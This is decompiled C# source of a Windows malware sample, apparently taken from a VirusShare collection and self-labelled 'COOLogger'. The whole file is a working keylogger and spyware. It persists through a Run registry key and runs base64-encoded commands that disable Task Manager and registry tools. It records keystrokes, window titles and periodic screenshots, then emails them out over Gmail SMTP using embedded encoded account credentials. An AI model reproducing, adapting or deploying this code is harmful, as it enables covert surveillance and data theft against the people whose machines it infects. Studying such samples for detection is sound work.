// Decompiled with JetBrains decompiler
// Type: FwWldOvxTvzOYsH
// Assembly: lol, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E01C4A33-3FC8-4057-960C-9E4FD8B99EA1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00018-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1f8ec221d0f6854152888bbb1017cab0fcee3205f01336587cca66b002a252d1.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class FwWldOvxTvzOYsH
{
  private static string tgHdcFlDptTtFyR = "di5rYXNoMTJAZ21haWwuY29t";
  private static string OkHfXTfvLgUdBvZ = "bWFzdGVyMTI=";
  private static string bIchpfLTUSXuCJm = "smtp.gmail.com";
  private static int zyPTWNmCueMPjMQ = 587;
  private static string IgvoYGJdGKYiERE;
  private static string qSomPwOzEdEPJbY;
  private static string vRphepHVqenMHjl;
  private static string SmrzpVeediFMTxL;
  private static string KadgYwMFoXZtWbo;
  private static string ZOtDECHrlsWjiyD;
  private static int KVPhRnXhnjvNbjk = 1200000;
  private static string SoCQwOBFeSQKcZv = (string) null;
  private static string aehYxNGpXZuXbpz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string UiVIiFEgNfRVuVg = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string aspMiHyuHXmIvFc = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object eaJXwwXgsVoUrKj = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string tRMprYexGvbWXVa = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage LSZpQQfVYQpSwuc = new MailMessage();
  private static SmtpClient VzjfUoeVjtccPCd = new SmtpClient();
  [AccessedThroughProperty("NxshCsjwIqpdPqN")]
  private static zMaIZLPodaUmjHc _NxshCsjwIqpdPqN;
  private static object pBETopyJEhwQjDx;
  private static RichTextBox hKoZVJdULZjSSFr;

  static FwWldOvxTvzOYsH()
  {
    FwWldOvxTvzOYsH.NxshCsjwIqpdPqN = new zMaIZLPodaUmjHc();
    FwWldOvxTvzOYsH.pBETopyJEhwQjDx = (object) Path.GetFileName(Application.ExecutablePath);
    FwWldOvxTvzOYsH.hKoZVJdULZjSSFr = new RichTextBox();
  }

  private static zMaIZLPodaUmjHc NxshCsjwIqpdPqN
  {
    get => FwWldOvxTvzOYsH._NxshCsjwIqpdPqN;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (FwWldOvxTvzOYsH._NxshCsjwIqpdPqN != null)
        zMaIZLPodaUmjHc.KeyDown -= new zMaIZLPodaUmjHc.KeyDownEventHandler(FwWldOvxTvzOYsH.orjIXQzikFhlzKf);
      FwWldOvxTvzOYsH._NxshCsjwIqpdPqN = value;
      if (FwWldOvxTvzOYsH._NxshCsjwIqpdPqN == null)
        return;
      zMaIZLPodaUmjHc.KeyDown += new zMaIZLPodaUmjHc.KeyDownEventHandler(FwWldOvxTvzOYsH.orjIXQzikFhlzKf);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int TkwlicurOxJPLWn(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    FwWldOvxTvzOYsH.ZOtDECHrlsWjiyD = Conversions.ToString(true);
    FwWldOvxTvzOYsH.vRphepHVqenMHjl = Conversions.ToString(false);
    FwWldOvxTvzOYsH.SmrzpVeediFMTxL = Conversions.ToString(true);
    FwWldOvxTvzOYsH.KadgYwMFoXZtWbo = Conversions.ToString(true);
    FwWldOvxTvzOYsH.qSomPwOzEdEPJbY = Conversions.ToString(false);
    FwWldOvxTvzOYsH.IgvoYGJdGKYiERE = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\cjzbaqgjazcIFnb.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(FwWldOvxTvzOYsH.tRMprYexGvbWXVa + "\\cjzbaqgjazcIFnb.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.IgvoYGJdGKYiERE) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(FwWldOvxTvzOYsH.pBETopyJEhwQjDx))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(FwWldOvxTvzOYsH.pBETopyJEhwQjDx), Operators.ConcatenateObject(Operators.ConcatenateObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), FwWldOvxTvzOYsH.pBETopyJEhwQjDx));
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.qSomPwOzEdEPJbY))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\cjzbaqgjazcIFnb.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.vRphepHVqenMHjl))
      Interaction.Shell(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.aehYxNGpXZuXbpz), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.SmrzpVeediFMTxL))
      Interaction.Shell(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.UiVIiFEgNfRVuVg), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.KadgYwMFoXZtWbo))
      Interaction.Shell(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.aspMiHyuHXmIvFc), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 1200000;
    timer1.Tick += new EventHandler(FwWldOvxTvzOYsH.ZnVmZdDqoiBxUqP_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(FwWldOvxTvzOYsH.VRcfuQRbkfJYrLe_Ticked);
    timer2.Start();
    FwWldOvxTvzOYsH.NxshCsjwIqpdPqN.BHDPSgCENXSuLdx();
    Application.Run();
  }

  private static string oKLVsZDTyGZhWCx()
  {
    string lpString = new string(char.MinValue, 100);
    FwWldOvxTvzOYsH.TkwlicurOxJPLWn(FwWldOvxTvzOYsH.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string sfStQOqYpbfGfqk(string ZmlCFIzYngQyBVx) => Encoding.ASCII.GetString(Convert.FromBase64String(ZmlCFIzYngQyBVx));

  public static void ZnVmZdDqoiBxUqP_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(FwWldOvxTvzOYsH.ZOtDECHrlsWjiyD))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = FwWldOvxTvzOYsH.nGBpWefdiTNUxLK(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(FwWldOvxTvzOYsH.eaJXwwXgsVoUrKj, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR));
        message.To.Add(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = FwWldOvxTvzOYsH.hKoZVJdULZjSSFr.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR), FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.OkHfXTfvLgUdBvZ))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        FwWldOvxTvzOYsH.hKoZVJdULZjSSFr.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage lsZpQqfVyQpSwuc = FwWldOvxTvzOYsH.LSZpQQfVYQpSwuc;
      lsZpQqfVyQpSwuc.From = new MailAddress(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR));
      lsZpQqfVyQpSwuc.To.Add(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR));
      lsZpQqfVyQpSwuc.Subject = "COOLogger Logs from - " + Environment.UserName;
      lsZpQqfVyQpSwuc.Body = FwWldOvxTvzOYsH.hKoZVJdULZjSSFr.Text;
      SmtpClient vzjfUoeVjtccPcd = FwWldOvxTvzOYsH.VzjfUoeVjtccPCd;
      vzjfUoeVjtccPcd.Host = "smtp.gmail.com";
      vzjfUoeVjtccPcd.Port = 587;
      vzjfUoeVjtccPcd.EnableSsl = true;
      vzjfUoeVjtccPcd.Credentials = (ICredentialsByHost) new NetworkCredential(FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.tgHdcFlDptTtFyR), FwWldOvxTvzOYsH.sfStQOqYpbfGfqk(FwWldOvxTvzOYsH.OkHfXTfvLgUdBvZ));
      vzjfUoeVjtccPcd.Send(FwWldOvxTvzOYsH.LSZpQQfVYQpSwuc);
      FwWldOvxTvzOYsH.hKoZVJdULZjSSFr.Text = "";
    }
  }

  public static void orjIXQzikFhlzKf(Keys e) => FwWldOvxTvzOYsH.hKoZVJdULZjSSFr.Text += FwWldOvxTvzOYsH.NxshCsjwIqpdPqN.RLBgppoteXeJWVl(e);

  public static void VRcfuQRbkfJYrLe_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(FwWldOvxTvzOYsH.SoCQwOBFeSQKcZv, FwWldOvxTvzOYsH.oKLVsZDTyGZhWCx(), false) == 0)
      return;
    FwWldOvxTvzOYsH.SoCQwOBFeSQKcZv = FwWldOvxTvzOYsH.oKLVsZDTyGZhWCx();
    if (Operators.CompareString(FwWldOvxTvzOYsH.SoCQwOBFeSQKcZv, "", false) == 0)
      return;
    RichTextBox hKoZvJdUlZjSsFr = FwWldOvxTvzOYsH.hKoZVJdULZjSSFr;
    hKoZvJdUlZjSsFr.Text = hKoZvJdUlZjSsFr.Text + "\r\n\r\n~~~~~" + FwWldOvxTvzOYsH.SoCQwOBFeSQKcZv + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string nGBpWefdiTNUxLK(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
